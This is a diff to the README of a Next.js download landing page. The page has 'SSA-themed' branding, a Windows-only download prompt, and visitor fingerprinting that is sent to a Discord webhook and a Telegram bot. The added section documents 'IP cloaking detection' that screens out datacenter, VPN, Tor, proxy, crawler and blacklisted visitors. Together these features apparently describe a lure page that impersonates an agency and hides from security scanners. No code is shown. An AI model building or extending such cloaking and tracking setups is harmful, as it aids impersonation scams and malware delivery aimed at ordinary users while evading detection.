@@ -19,15 +19,17 @@ This is a Next.js 16 web application that serves as a download landing page. It 
 /
 ├── src/
 │   ├── app/
-│   │   ├── api/track/route.ts    # Tracking API endpoint
+│   │   ├── api/track/route.ts    # Tracking API endpoint with cloaking detection
 │   │   ├── page.tsx              # Main landing page
 │   │   ├── layout.tsx            # Root layout
 │   │   └── globals.css           # Global styles
+│   ├── lib/
+│   │   └── ipCheck.ts            # IP cloaking detection utility (ipapi.is)
 │   └── components/
 │       ├── DownloadGuide.tsx     # Download notification component
 │       └── PlatformModal.tsx     # Windows-only warning modal
 ├── public/                        # Static assets (logos, downloadable files)
-├── next.config.ts                # Next.js configuration (configured for Replit)
+├── next.config.ts                # Next.js configuration
 ├── package.json                  # Dependencies and scripts
 └── tsconfig.json                 # TypeScript configuration
 ```
@@ -44,7 +46,17 @@ This is a Next.js 16 web application that serves as a download landing page. It 
    - Sends events to Discord webhook and Telegram bot
    - Captures IP, user agent, platform, screen resolution, language, and referrer
 
-3. **Visual Feedback**
+3. **Advanced IP Cloaking Detection (ipapi.is)**
+   - Datacenter/hosting provider detection
+   - VPN exit node detection
+   - Tor exit node detection
+   - Proxy detection (SOCKS4, SOCKS5, HTTP)
+   - Search engine bot/crawler detection
+   - Combined blacklist check (Firehol, IPsum, abuse databases)
+   - Geolocation and ASN information
+   - Mobile network detection
+
+4. **Visual Feedback**
    - Download guide notification with animation
    - Platform compatibility modal
    - SSA-themed branding and styling
@@ -53,11 +65,16 @@ This is a Next.js 16 web application that serves as a download landing page. It 
 
 ### Environment Variables (Optional)
 Create these environment variables for tracking functionality:
+
+**Notification Services:**
 - `DISCORD_WEBHOOK_URL` - Discord webhook for event notifications
 - `TELEGRAM_BOT_TOKEN` - Telegram bot token for notifications
 - `TELEGRAM_CHAT_ID` - Telegram chat ID for notifications
 
-Note: The app works without these variables, but tracking notifications won't be sent.
+**IP Detection / Cloaking API:**
+- `IPAPI_API_KEY` - Optional API key from ipapi.is for higher rate limits (free: 1000 requests/day without key)
+
+Note: The app works without these variables, but tracking notifications and enhanced IP detection won't be available.
 
 ### Replit-Specific Configuration
 The application is configured to work seamlessly with Replit's proxy environment:
@@ -83,6 +100,12 @@ npm start
 This project is configured for Replit deployment with autoscale mode, suitable for stateless web applications.
 
 ## Recent Changes
+- **2025-12-04:** Added advanced IP cloaking detection
+  - Integrated ipapi.is API for comprehensive IP security analysis
+  - Detection for: datacenter, VPN, Tor, proxy, bots, blacklists
+  - Enhanced notification messages with security check results
+  - Added IPAPI_API_KEY environment variable support
+
 - **2025-12-04:** Initial Replit setup
   - Configured package.json scripts to run Next.js dev server on port 5000 with 0.0.0.0 host binding
   - Improved tracking API to handle empty request bodies gracefully
